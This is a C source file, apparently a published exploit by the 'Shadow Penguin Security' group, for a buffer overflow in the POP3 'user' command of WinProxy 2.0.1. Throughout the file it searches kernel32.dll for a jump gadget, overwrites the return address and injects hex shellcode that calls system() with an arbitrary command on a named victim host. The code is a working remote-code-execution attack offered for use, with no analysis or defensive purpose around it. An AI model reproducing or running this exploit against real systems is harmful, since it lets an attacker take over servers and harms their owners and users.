/*=========================================================================
====
   WinProxy 2.0.1 Overflow Exploit
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =========================================================================
====
*/


#include    <stdio.h>
#include    <string.h>
#include    <windows.h>
#include    <winsock.h>


#define     PORT            110
#define     MAXBUF          700
#define     MAXPACKETBUF    32000
#define     RETADR          312
#define     JMPADR          308
#define     CODEOFS         316
#define     JMPEAX_1        0xff
#define     JMPEAX_2        0xe3
#define     NOP             0x90
#define     KERNEL_NAME     "kernel32.dll"


unsigned char exploit_code[200]={
0xEB,0x4B,0x5B,0x53,0x32,0xE4,0x83,0xC3,
0x0B,0x4B,0x88,0x23,0xB8,0x50,0x77,0xF7,
0xBF,0xFF,0xD0,0x8B,0xD0,0x52,0x43,0x53,
0x52,0x32,0xE4,0x83,0xC3,0x06,0x88,0x23,
0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x8B,
0xF0,0x5A,0x43,0x53,0x52,0x32,0xE4,0x83,
0xC3,0x04,0x88,0x23,0xB8,0x28,0x6E,0xF7,
0xBF,0xFF,0xD0,0x8B,0xF8,0x43,0x53,0x83,
0xC3,0x0B,0x32,0xE4,0x88,0x23,0xFF,0xD6,
0x33,0xC0,0x50,0xFF,0xD7,0xE8,0xB0,0xFF,
0xFF,0xFF,0x00};
unsigned char cmdbuf[200]="msvcrt.dll.system.exit.";


unsigned int search_mem(unsigned char *st,unsigned char *ed,
                unsigned char c1,unsigned char c2)
{
    unsigned char   *p;
    unsigned int    adr;


    for (p=st;p<ed;p++)
        if (*p==c1 && *(p+1)==c2){
            adr=(unsigned int)p;
            if ((adr&0xff)==0) continue;
            if (((adr>>8)&0xff)==0) continue;
            if (((adr>>16)&0xff)==0) continue;
            if (((adr>>24)&0xff)==0) continue;
            return(adr);
        }
    return(0);
}


main(int argc,char *argv[])
{
    SOCKET               sock;
    SOCKADDR_IN          addr;
    WSADATA              wsa;
    WORD                 wVersionRequested;
    unsigned int         i,kp,ip,p1,p2,p;
    unsigned int         pretadr;
    static unsigned char buf[MAXBUF],packetbuf[MAXPACKETBUF],*q;
    struct hostent       *hs;
    MEMORY_BASIC_INFORMATION meminfo;


    if (argc<3){
        printf("usage: %s VictimHost Command\n",argv[0]);
        exit(1);
    }
    if ((void *)(kp=(unsigned int)LoadLibrary(KERNEL_NAME))==NULL){
        printf("Can not find %s\n",KERNEL_NAME);
        exit(1);
    }


    VirtualQuery((void *)kp,&meminfo,sizeof(MEMORY_BASIC_INFORMATION));
    pretadr=0;
    for (i=0;i<meminfo.RegionSize;i++){
        p=kp+i;
        if ( ( p     &0xff)==0
          || ((p>>8 )&0xff)==0
          || ((p>>16)&0xff)==0
          || ((p>>24)&0xff)==0) continue;
        if (*((unsigned char *)p)==JMPEAX_1 && *(((unsigned char *)p)+1)==
JMPEAX_2) pretadr=p;
    }
    printf("RETADR         : %x\n",pretadr);
    if (pretadr==0){
        printf("Can not find codes which are used by exploit.\n");
        exit(1);
    }


    wVersionRequested = MAKEWORD( 2, 0 );
    if (WSAStartup(wVersionRequested , &wsa)!=0){
        printf("Winsock Initialization failed.\n"); return -1;
    }
    if ((sock=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET){
        printf("Can not create socket.\n"); return -1;
    }
    addr.sin_family     = AF_INET;
    addr.sin_port       = htons((u_short)PORT);
    if ((addr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
            if ((hs=gethostbyname(argv[1]))==NULL){
                printf("Can not resolve specified host.\n"); return -1;
            }
            addr.sin_family = hs->h_addrtype;
            memcpy((void *)&addr.sin_addr.s_addr,hs->h_addr,hs->h_length);
    }
    if (connect(sock,(LPSOCKADDR)&addr,sizeof(addr))==SOCKET_ERROR){
        printf("Can not connect to specified host.\n"); return -1;
    }


    memset(buf,NOP,MAXBUF); buf[MAXBUF-1]=0;
    for (i=0;i<10;i++) memset(buf+300+i*10,0x40+i,10);


    ip=pretadr;
    buf[RETADR  ]=ip&0xff;
    buf[RETADR+1]=(ip>>8)&0xff;
    buf[RETADR+2]=(ip>>16)&0xff;
    buf[RETADR+3]=(ip>>24)&0xff;
    buf[JMPADR  ]=0xeb;
    buf[JMPADR+1]=0x06;
    buf[RETADR+6]=0xcd;
    buf[RETADR+7]=0x01;


    p1=(unsigned int)GetProcAddress((HINSTANCE)kp,"LoadLibraryA");
    p2=(unsigned int)GetProcAddress((HINSTANCE)kp,"GetProcAddress");


    printf("LoadLibraryA   : %x\n",p1);
    printf("GetProcAddress : %x\n",p2);
    if ( ( p1     &0xff)==0
      || ((p1>>8 )&0xff)==0
      || ((p1>>16)&0xff)==0
      || ((p1>>24)&0xff)==0
      || ( p2     &0xff)==0
      || ((p2>>8 )&0xff)==0
      || ((p2>>16)&0xff)==0
      || ((p2>>24)&0xff)==0){
        printf("NULL code is included.\n");
        exit(1);
    }


    strcat(cmdbuf,argv[2]);
    strcat(exploit_code,cmdbuf);
    exploit_code[0x0d]=p1&0xff;
    exploit_code[0x0e]=(p1>>8)&0xff;
    exploit_code[0x0f]=(p1>>16)&0xff;
    exploit_code[0x10]=(p1>>24)&0xff;
    exploit_code[0x21]=exploit_code[0x35]=p2&0xff;
    exploit_code[0x22]=exploit_code[0x36]=(p2>>8)&0xff;
    exploit_code[0x23]=exploit_code[0x37]=(p2>>16)&0xff;
    exploit_code[0x24]=exploit_code[0x38]=(p2>>24)&0xff;
    exploit_code[0x41]=strlen(argv[2]);


    memcpy(buf+CODEOFS,exploit_code,strlen(exploit_code));


    sprintf(packetbuf,"user %s\r\n",buf);
    send(sock,packetbuf,strlen(packetbuf),0);
    Sleep(3000);
    closesocket(sock);
    printf("Done.\n");
    return FALSE;
}

